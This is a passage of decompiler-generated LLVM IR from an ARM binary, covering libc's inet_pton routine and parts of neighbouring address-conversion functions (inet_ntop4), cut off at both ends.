  br i1 %v2_11760, label %dec_label_pc_117ac, label %dec_label_pc_1176c

dec_label_pc_1176c:                               ; preds = %bb
  %v0_1176c = load i32, i32* @lr, align 4
  %v7_1176c = icmp eq i32 %v0_1176c, 4
  store i1 %v7_1176c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1176c, label %dec_label_pc_117ac, label %dec_label_pc_11774

dec_label_pc_11774:                               ; preds = %dec_label_pc_1176c
  %v2_11774 = load i32, i32* %r0.global-to-local, align 4
  %v3_11774 = add i32 %v2_11774, 1
  %v4_11774 = inttoptr i32 %v3_11774 to i8*
  store i8 0, i8* %v4_11774, align 1
  %v5_11774 = load i32, i32* %r0.global-to-local, align 4
  %v6_11774 = add i32 %v5_11774, 1
  store i32 %v6_11774, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11778.backedge

dec_label_pc_11778.backedge:                      ; preds = %dec_label_pc_11774, %dec_label_pc_11734, %dec_label_pc_11740
  %v0_11778 = load i32, i32* @r4, align 4
  %v1_11778 = inttoptr i32 %v0_11778 to i8*
  %v2_11778 = load i8, i8* %v1_11778, align 1
  %v3_11778 = zext i8 %v2_11778 to i32
  %v5_11778 = add i32 %v0_11778, 1
  store i32 %v5_11778, i32* @r4, align 4
  %v2_1177c = icmp eq i8 %v2_11778, 0
  store i1 %v2_1177c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1177c, label %dec_label_pc_11778.dec_label_pc_11788_crit_edge, label %dec_label_pc_11710

dec_label_pc_11778.dec_label_pc_11788_crit_edge:  ; preds = %dec_label_pc_11778.backedge
  %v0_11788.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_11788

dec_label_pc_11788:                               ; preds = %dec_label_pc_11778.dec_label_pc_11788_crit_edge, %entry
  %v0_11788 = phi i32 [ %v0_11788.pre, %dec_label_pc_11778.dec_label_pc_11788_crit_edge ], [ 0, %entry ]
  %v7_11788 = icmp eq i32 %v0_11788, 3
  store i1 %v7_11788, i1* %cpsr_z.global-to-local, align 1
  %v7_1178c = icmp slt i32 %v0_11788, 4
  br i1 %v7_1178c, label %dec_label_pc_117ac, label %dec_label_pc_11790

dec_label_pc_11790:                               ; preds = %dec_label_pc_11788
  %v0_11790 = load i32, i32* @r5, align 4
  store i32 %v0_11790, i32* @r0, align 4
  store i32 %v2_116f0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1179c = call i32 @memcpy()
  br label %dec_label_pc_117ac

dec_label_pc_117ac:                               ; preds = %dec_label_pc_1171c, %dec_label_pc_11740, %bb, %dec_label_pc_1176c, %.thread12, %dec_label_pc_11788, %dec_label_pc_11790
  %storemerge = phi i32 [ 1, %dec_label_pc_11790 ], [ 0, %dec_label_pc_11788 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1176c ], [ 0, %bb ], [ 0, %dec_label_pc_11740 ], [ 0, %dec_label_pc_1171c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_116e8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_11788, { 1, 0 }
  uselistorder i32 %v3_11778, { 1, 0 }
  uselistorder i32 %v0_11754, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 10, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_117ac, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_11778.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11710, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_117b4 = load i32, i32* @r4, align 4
  %v6_117b4 = load i32, i32* @r5, align 4
  %v9_117b4 = load i32, i32* @r6, align 4
  %v7_117b8 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_117b8, label %dec_label_pc_117d8, label %dec_label_pc_117cc

dec_label_pc_117cc:                               ; preds = %entry
  %v7_117cc = icmp eq i32 %arg1, 10
  br i1 %v7_117cc, label %dec_label_pc_117ec, label %dec_label_pc_1199c

dec_label_pc_117d8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_117e0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_117e0, i32* %r0.global-to-local, align 4
  store i32 %v4_117e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_119b4

dec_label_pc_117ec:                               ; preds = %dec_label_pc_117cc
  %v2_117ec = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_117ec, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_117f8 = bitcast i32* %stack_var_-52 to i8*
  %v3_117f8 = call i32 @__GI_memset(i8* %v2_117f8, i32 0)
  store i32 %v3_117f8, i32* %r0.global-to-local, align 4
  %v0_117fc = load i32, i32* @r6, align 4
  %v1_117fc = inttoptr i32 %v0_117fc to i8*
  %v2_117fc = load i8, i8* %v1_117fc, align 1
  %v3_117fc = zext i8 %v2_117fc to i32
  store i32 %v3_117fc, i32* %r3.global-to-local, align 4
  %v7_11800 = icmp eq i8 %v2_117fc, 58
  store i32 %v3_117f8, i32* @r4, align 4
  %v2_11808 = add i32 %v3_117f8, 16
  store i32 %v2_11808, i32* %r8.global-to-local, align 4
  br i1 %v7_11800, label %dec_label_pc_11810, label %dec_label_pc_1181c

dec_label_pc_11810:                               ; preds = %dec_label_pc_117ec
  %v1_11810 = add i32 %v0_117fc, 1
  %v2_11810 = inttoptr i32 %v1_11810 to i8*
  %v3_11810 = load i8, i8* %v2_11810, align 1
  %v4_11810 = zext i8 %v3_11810 to i32
  store i32 %v4_11810, i32* %r3.global-to-local, align 4
  store i32 %v1_11810, i32* @r6, align 4
  %v7_11814 = icmp eq i8 %v3_11810, 58
  br i1 %v7_11814, label %dec_label_pc_1181c, label %dec_label_pc_119b0

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11810, %dec_label_pc_117ec
  %v0_11820 = phi i32 [ %v1_11810, %dec_label_pc_11810 ], [ %v0_117fc, %dec_label_pc_117ec ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_11820, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_118fc7 = inttoptr i32 %v0_11820 to i8*
  %v2_118fc8 = load i8, i8* %v1_118fc7, align 1
  %v3_118fc9 = zext i8 %v2_118fc8 to i32
  store i32 %v3_118fc9, i32* %r0.global-to-local, align 4
  %v1_1190010 = call i32 @__GI_tolower(i32 %v3_118fc9)
  store i32 %v1_1190010, i32* %r0.global-to-local, align 4
  store i32 %v1_1190010, i32* @r5, align 4
  %v2_1190412 = icmp eq i32 %v1_1190010, 0
  br i1 %v2_1190412, label %dec_label_pc_1190c, label %dec_label_pc_11830

dec_label_pc_11830:                               ; preds = %dec_label_pc_1181c, %dec_label_pc_118fc.backedge
  %v0_11834 = phi i32 [ %v1_11900, %dec_label_pc_118fc.backedge ], [ %v1_1190010, %dec_label_pc_1181c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_118fc.backedge ], [ 0, %dec_label_pc_1181c ]
  store i32 ptrtoint ([17 x i8]* @global_var_15664.745 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_15664.745 to i32), i32* %r0.global-to-local, align 4
  %v3_1183c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_15664.745 to i32), i32 %v0_11834)
  %v4_1183c = trunc i32 %v3_1183c to i8
  store i32 %v3_1183c, i32* %r0.global-to-local, align 4
  %v3_11840 = icmp eq i8 %v4_1183c, 0
  %v0_11844 = load i32, i32* @r6, align 4
  %v1_11844 = add i32 %v0_11844, 1
  store i32 %v1_11844, i32* @r6, align 4
  br i1 %v3_11840, label %dec_label_pc_11860, label %dec_label_pc_1184c

dec_label_pc_1184c:                               ; preds = %dec_label_pc_11830
  %v0_1184c = load i32, i32* %sb.global-to-local, align 4
  %v2_1184c = sext i8 %v4_1183c to i32
  %v3_1184c = sub i32 %v2_1184c, %v0_1184c
  store i32 %v3_1184c, i32* %r3.global-to-local, align 4
  %v1_11850 = load i32, i32* %r7.global-to-local, align 4
  %v4_11850 = mul i32 %v1_11850, 16
  %v5_11850 = or i32 %v4_11850, %v3_1184c
  store i32 %v5_11850, i32* %r7.global-to-local, align 4
  %v3_11858 = icmp ult i32 %v5_11850, 65534
  br i1 %v3_11858, label %dec_label_pc_118f4, label %dec_label_pc_119b0

dec_label_pc_11860:                               ; preds = %dec_label_pc_11830
  %v0_11860 = load i32, i32* @r5, align 4
  %v7_11860 = icmp eq i32 %v0_11860, 58
  br i1 %v7_11860, label %dec_label_pc_11868, label %dec_label_pc_118c4

dec_label_pc_11868:                               ; preds = %dec_label_pc_11860
  %v4_118682 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_118682, i32* %r3.global-to-local, align 4
  %v2_1186c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1186c, label %dec_label_pc_11874, label %dec_label_pc_11888

dec_label_pc_11874:                               ; preds = %dec_label_pc_11868
  %v0_11874 = load i32, i32* %fp.global-to-local, align 4
  %v2_11874 = icmp eq i32 %v0_11874, 0
  br i1 %v2_11874, label %dec_label_pc_1187c, label %dec_label_pc_119b0

dec_label_pc_1187c:                               ; preds = %dec_label_pc_11874
  %v0_1187c = load i32, i32* @r4, align 4
  store i32 %v0_1187c, i32* %fp.global-to-local, align 4
  store i32 %v1_11844, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_118fc.backedge

dec_label_pc_11888:                               ; preds = %dec_label_pc_11868
  %v1_11888 = inttoptr i32 %v1_11844 to i8*
  %v2_11888 = load i8, i8* %v1_11888, align 1
  %v3_11888 = zext i8 %v2_11888 to i32
  store i32 %v3_11888, i32* %r3.global-to-local, align 4
  %v2_1188c = icmp eq i8 %v2_11888, 0
  br i1 %v2_1188c, label %dec_label_pc_119b0, label %dec_label_pc_11894

dec_label_pc_11894:                               ; preds = %dec_label_pc_11888
  %v0_11894 = load i32, i32* @r4, align 4
  %v1_11894 = add i32 %v0_11894, 2
  store i32 %v1_11894, i32* %r3.global-to-local, align 4
  %v1_11898 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_11894, %v1_11898
  br i1 %tmp38, label %dec_label_pc_119b0, label %dec_label_pc_118a0

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11894
  %v0_118a0 = load i32, i32* %r7.global-to-local, align 4
  %v3_118a0 = udiv i32 %v0_118a0, 256
  store i32 %v3_118a0, i32* %r2.global-to-local, align 4
  store i32 %v0_11894, i32* %r3.global-to-local, align 4
  %v1_118a8 = trunc i32 %v3_118a0 to i8
  %v3_118a8 = inttoptr i32 %v0_11894 to i8*
  store i8 %v1_118a8, i8* %v3_118a8, align 1
  %v4_118a8 = load i32, i32* %r3.global-to-local, align 4
  %v5_118a8 = add i32 %v4_118a8, 1
  store i32 %v5_118a8, i32* %r3.global-to-local, align 4
  %v0_118ac = load i32, i32* @r6, align 4
  store i32 %v0_118ac, i32* %sl.global-to-local, align 4
  %v0_118b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_118b0 = trunc i32 %v0_118b0 to i8
  %v2_118b0 = load i32, i32* @r4, align 4
  %v3_118b0 = add i32 %v2_118b0, 1
  %v4_118b0 = inttoptr i32 %v3_118b0 to i8*
  store i8 %v1_118b0, i8* %v4_118b0, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_118b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_118b8 = add i32 %v0_118b8, 1
  store i32 %v1_118b8, i32* @r4, align 4
  %v0_118fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_118fc.backedge

dec_label_pc_118c4:                               ; preds = %dec_label_pc_11860
  %v7_118c4 = icmp eq i32 %v0_11860, 46
  br i1 %v7_118c4, label %dec_label_pc_118cc, label %dec_label_pc_119b0

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118c4
  %v0_118cc = load i32, i32* @r4, align 4
  %v1_118cc = add i32 %v0_118cc, 4
  store i32 %v1_118cc, i32* @r5, align 4
  %v1_118d0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_118cc, %v1_118d0
  br i1 %tmp39, label %dec_label_pc_119b0, label %dec_label_pc_118d8

dec_label_pc_118d8:                               ; preds = %dec_label_pc_118cc
  %v0_118dc = load i32, i32* %sl.global-to-local, align 4
  %v1_118dc = inttoptr i32 %v0_118dc to i8*
  store i32 %v0_118dc, i32* %r0.global-to-local, align 4
  %v4_118e0 = call i32 @inet_pton4(i8* %v1_118dc, i32 %v0_118cc)
  store i32 %v4_118e0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_118e0, 1
  br i1 %tmp36, label %dec_label_pc_119b0, label %bb

bb:                                               ; preds = %dec_label_pc_118d8
  %v5_118e8 = load i32, i32* @r5, align 4
  store i32 %v5_118e8, i32* @r4, align 4
  br label %dec_label_pc_11938

dec_label_pc_118f4:                               ; preds = %dec_label_pc_1184c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_118fc.backedge

dec_label_pc_118fc.backedge:                      ; preds = %dec_label_pc_118f4, %dec_label_pc_1187c, %dec_label_pc_118a0
  %v0_118fc = phi i32 [ %v1_11844, %dec_label_pc_1187c ], [ %v0_118fc.pre, %dec_label_pc_118a0 ], [ %v1_11844, %dec_label_pc_118f4 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1187c ], [ 0, %dec_label_pc_118a0 ], [ 1, %dec_label_pc_118f4 ]
  %v1_118fc = inttoptr i32 %v0_118fc to i8*
  %v2_118fc = load i8, i8* %v1_118fc, align 1
  %v3_118fc = zext i8 %v2_118fc to i32
  store i32 %v3_118fc, i32* %r0.global-to-local, align 4
  %v1_11900 = call i32 @__GI_tolower(i32 %v3_118fc)
  store i32 %v1_11900, i32* %r0.global-to-local, align 4
  store i32 %v1_11900, i32* @r5, align 4
  %v2_11904 = icmp eq i32 %v1_11900, 0
  br i1 %v2_11904, label %dec_label_pc_1190c, label %dec_label_pc_11830

dec_label_pc_1190c:                               ; preds = %dec_label_pc_118fc.backedge, %dec_label_pc_1181c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1181c ], [ %stack_var_-56.0.be, %dec_label_pc_118fc.backedge ]
  %v4_1190c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1190c3, i32* %r3.global-to-local, align 4
  %v2_11910 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1197c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_11910, label %dec_label_pc_11938, label %dec_label_pc_11918

dec_label_pc_11918:                               ; preds = %dec_label_pc_1190c
  %v1_11918 = add i32 %v0_1197c.pre.pre, 2
  store i32 %v1_11918, i32* %r3.global-to-local, align 4
  %v1_1191c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_11918, %v1_1191c
  br i1 %tmp40, label %dec_label_pc_119b0, label %dec_label_pc_11924

dec_label_pc_11924:                               ; preds = %dec_label_pc_11918
  store i32 %v0_1197c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_11928 = load i32, i32* %r7.global-to-local, align 4
  %v3_11928 = udiv i32 %v0_11928, 256
  store i32 %v3_11928, i32* %r2.global-to-local, align 4
  %v1_1192c = trunc i32 %v3_11928 to i8
  %v3_1192c = inttoptr i32 %v0_1197c.pre.pre to i8*
  store i8 %v1_1192c, i8* %v3_1192c, align 1
  %v4_1192c = load i32, i32* %r3.global-to-local, align 4
  %v5_1192c = add i32 %v4_1192c, 1
  store i32 %v5_1192c, i32* %r3.global-to-local, align 4
  %v0_11930 = load i32, i32* %r7.global-to-local, align 4
  %v1_11930 = trunc i32 %v0_11930 to i8
  %v2_11930 = load i32, i32* @r4, align 4
  %v3_11930 = add i32 %v2_11930, 1
  %v4_11930 = inttoptr i32 %v3_11930 to i8*
  store i8 %v1_11930, i8* %v4_11930, align 1
  %v0_11934 = load i32, i32* %r3.global-to-local, align 4
  %v1_11934 = add i32 %v0_11934, 1
  store i32 %v1_11934, i32* @r4, align 4
  br label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %dec_label_pc_1190c, %bb, %dec_label_pc_11924
  %v0_1197c.pre = phi i32 [ %v5_118e8, %bb ], [ %v1_11934, %dec_label_pc_11924 ], [ %v0_1197c.pre.pre, %dec_label_pc_1190c ]
  %v0_11938 = load i32, i32* %fp.global-to-local, align 4
  %v2_11938 = icmp eq i32 %v0_11938, 0
  %v1_1197c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_11938, label %dec_label_pc_1197c, label %dec_label_pc_11940

dec_label_pc_11940:                               ; preds = %dec_label_pc_11938
  %v9_11940 = icmp eq i32 %v0_1197c.pre, %v1_1197c.pre
  %v2_11944 = sub i32 %v0_1197c.pre, %v0_11938
  store i32 %v2_11944, i32* %r0.global-to-local, align 4
  br i1 %v9_11940, label %dec_label_pc_119b0, label %dec_label_pc_11964.preheader

dec_label_pc_11964.preheader:                     ; preds = %dec_label_pc_11940
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11964

dec_label_pc_11954:                               ; preds = %dec_label_pc_11964
  %v0_11954 = load i32, i32* %fp.global-to-local, align 4
  %v2_11954 = add i32 %v0_11954, %v2_11968
  %v3_11954 = inttoptr i32 %v2_11954 to i8*
  %v4_11954 = load i8, i8* %v3_11954, align 1
  %v3_11958 = inttoptr i32 %v2_1196c to i8*
  store i8 %v4_11954, i8* %v3_11958, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11960 = load i32, i32* %fp.global-to-local, align 4
  %v3_11960 = load i32, i32* %ip.global-to-local, align 4
  %v4_11960 = add i32 %v3_11960, %v2_11960
  %v5_11960 = inttoptr i32 %v4_11960 to i8*
  store i8 0, i8* %v5_11960, align 1
  %v0_11964.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11964.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1196c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11964

dec_label_pc_11964:                               ; preds = %dec_label_pc_11964.preheader, %dec_label_pc_11954
  %v0_11978 = phi i32 [ %v1_1197c.pre, %dec_label_pc_11964.preheader ], [ %v1_1196c.pre, %dec_label_pc_11954 ]
  %v1_11968 = phi i32 [ %v2_11944, %dec_label_pc_11964.preheader ], [ %v1_11964.pre, %dec_label_pc_11954 ]
  %v0_11970 = phi i32 [ 1, %dec_label_pc_11964.preheader ], [ %v0_11964.pre, %dec_label_pc_11954 ]
  %v2_11968 = sub i32 %v1_11968, %v0_11970
  store i32 %v2_11968, i32* %ip.global-to-local, align 4
  %v2_1196c = sub i32 %v0_11978, %v0_11970
  store i32 %v2_1196c, i32* @lr, align 4
  %v1_11970 = add i32 %v0_11970, 1
  store i32 %v1_11970, i32* %r2.global-to-local, align 4
  %v7_11974 = icmp slt i32 %v1_11968, %v0_11970
  br i1 %v7_11974, label %dec_label_pc_11978, label %dec_label_pc_11954

dec_label_pc_11978:                               ; preds = %dec_label_pc_11964
  store i32 %v0_11978, i32* @r4, align 4
  br label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11938, %dec_label_pc_11978
  %v0_1197c = phi i32 [ %v0_11978, %dec_label_pc_11978 ], [ %v0_1197c.pre, %dec_label_pc_11938 ]
  %v1_1197c = phi i32 [ %v0_11978, %dec_label_pc_11978 ], [ %v1_1197c.pre, %dec_label_pc_11938 ]
  %v9_1197c = icmp eq i32 %v0_1197c, %v1_1197c
  br i1 %v9_1197c, label %dec_label_pc_11984, label %dec_label_pc_119b0

dec_label_pc_11984:                               ; preds = %dec_label_pc_1197c
  store i32 16, i32* @r2, align 4
  %v2_11988 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_11988, i32* @r0, align 4
  store i32 %v2_117ec, i32* @r1, align 4
  %v0_11990 = call i32 @memcpy()
  store i32 %v0_11990, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_119b4

dec_label_pc_1199c:                               ; preds = %dec_label_pc_117cc
  %v0_1199c = call i32 @__errno_location()
  store i32 %v0_1199c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_119a8 = inttoptr i32 %v0_1199c to i32*
  store i32 97, i32* %v2_119a8, align 4
  %v0_119b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_119b4

dec_label_pc_119b0:                               ; preds = %dec_label_pc_1184c, %dec_label_pc_11874, %dec_label_pc_11894, %dec_label_pc_11888, %dec_label_pc_118d8, %dec_label_pc_11940, %dec_label_pc_118c4, %dec_label_pc_1197c, %dec_label_pc_11810, %dec_label_pc_11918, %dec_label_pc_118cc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %dec_label_pc_1199c, %dec_label_pc_11984, %dec_label_pc_117d8, %dec_label_pc_119b0
  %v0_119b4 = phi i32 [ %v0_119b4.pre, %dec_label_pc_1199c ], [ 1, %dec_label_pc_11984 ], [ %v4_117e0, %dec_label_pc_117d8 ], [ 0, %dec_label_pc_119b0 ]
  store i32 %v0_119b4, i32* %r0.global-to-local, align 4
  store i32 %v3_117b4, i32* @r4, align 4
  store i32 %v6_117b4, i32* @r5, align 4
  store i32 %v9_117b4, i32* @r6, align 4
  ret i32 %v0_119b4

; uselistorder directives
  uselistorder i32 %v0_119b4, { 1, 0 }
  uselistorder i32 %v2_1196c, { 1, 0 }
  uselistorder i32 %v2_11968, { 1, 0 }
  uselistorder i32 %v0_11970, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11978, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1197c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1197c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_11928, { 1, 0 }
  uselistorder i32 %v0_1197c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_11900, { 1, 2, 3, 0 }
  uselistorder i32 %v0_118dc, { 1, 0 }
  uselistorder i32 %v3_118a0, { 1, 0 }
  uselistorder i32 %v0_11894, { 1, 0, 2 }
  uselistorder i32 %v1_11844, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1183c, { 1, 0 }
  uselistorder i32 %v0_11820, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 11, 10, 7, 6, 9, 8, 17, 16, 13, 12, 15, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_119b4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_119b0, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1197c, { 1, 0 }
  uselistorder label %dec_label_pc_11964, { 1, 0 }
  uselistorder label %dec_label_pc_11938, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118fc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11830, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_119c4 = load i32, i32* @r4, align 4
  store i32 %v3_119c4, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_15650.747 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_119e0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_119e0, i32* @r0, align 4
  %v0_119e4 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_119f4 = bitcast i32* %stack_var_-51 to i8*
  %v3_119f4 = call i32 @__GI_memset(i8* %v2_119f4, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_11abc = ptrtoint i32* %stack_var_-36 to i32
  %v2_11a98 = add i32 %v2_11abc, -17
  br label %dec_label_pc_11abc

dec_label_pc_11a04:                               ; preds = %dec_label_pc_11abc
  %v0_11a04 = load i32, i32* %fp.global-to-local, align 4
  %v2_11a04 = add i32 %v0_11a04, %v1_11a04
  %v3_11a04 = inttoptr i32 %v2_11a04 to i8*
  %v4_11a04 = load i8, i8* %v3_11a04, align 1
  %v6_11a04 = zext i8 %v4_11a04 to i32
  store i32 %v6_11a04, i32* %r4.global-to-local, align 4
  %v1_11a08 = add i32 %v0_11a08, 1
  store i32 %v1_11a08, i32* %r7.global-to-local, align 4
  store i32 %v2_11abc, i32* %r2.global-to-local, align 4
  %v2_11a14 = add i32 %v1_11a08, %v2_11abc
  store i32 %v2_11a14, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_11a04, 100
  %v1_11a1c = or i8 %div, 48
  %v3_11a20 = add i32 %v2_11acc, -17
  %v4_11a20 = inttoptr i32 %v3_11a20 to i8*
  store i8 %v1_11a1c, i8* %v4_11a20, align 1
  %v0_11a24 = load i32, i32* %r5.global-to-local, align 4
  %v1_11a24 = add i32 %v0_11a24, -17
  %v2_11a24 = inttoptr i32 %v1_11a24 to i8*
  %v3_11a24 = load i8, i8* %v2_11a24, align 1
  %v7_11a28 = icmp eq i8 %v3_11a24, 48
  %v0_11a2c = load i32, i32* %fp.global-to-local, align 4
  %v1_11a2c = load i32, i32* %r8.global-to-local, align 4
  %v2_11a2c = add i32 %v1_11a2c, %v0_11a2c
  store i32 %v2_11a2c, i32* %sb.global-to-local, align 4
  %v0_11a34 = load i32, i32* %r4.global-to-local, align 4
  %v2_11a3c = udiv i32 %v0_11a34, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_11a44 = urem i32 %v2_11a3c, 256
  %v2_11a48 = urem i32 %v1_11a44, 10
  %v1_11a4c = or i32 %v2_11a48, 48
  %v1_11a50 = trunc i32 %v1_11a4c to i8
  br i1 %v7_11a28, label %dec_label_pc_11a3c, label %dec_label_pc_11a64

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a04
  store i8 %v1_11a50, i8* %v2_11a24, align 1
  %v0_11a54 = load i32, i32* %r5.global-to-local, align 4
  %v1_11a54 = add i32 %v0_11a54, -17
  %v2_11a54 = inttoptr i32 %v1_11a54 to i8*
  %v3_11a54 = load i8, i8* %v2_11a54, align 1
  %v7_11a58 = icmp eq i8 %v3_11a54, 48
  br i1 %v7_11a58, label %dec_label_pc_11a3c.dec_label_pc_11a88_crit_edge, label %bb

dec_label_pc_11a3c.dec_label_pc_11a88_crit_edge:  ; preds = %dec_label_pc_11a3c
  %v1_11a98.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11a88

bb:                                               ; preds = %dec_label_pc_11a3c
  %v1_11a5c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_11a5c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11a88

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a04
  %v2_11a80 = load i32, i32* %sl.global-to-local, align 4
  %v3_11a80 = add i32 %v2_11a80, -17
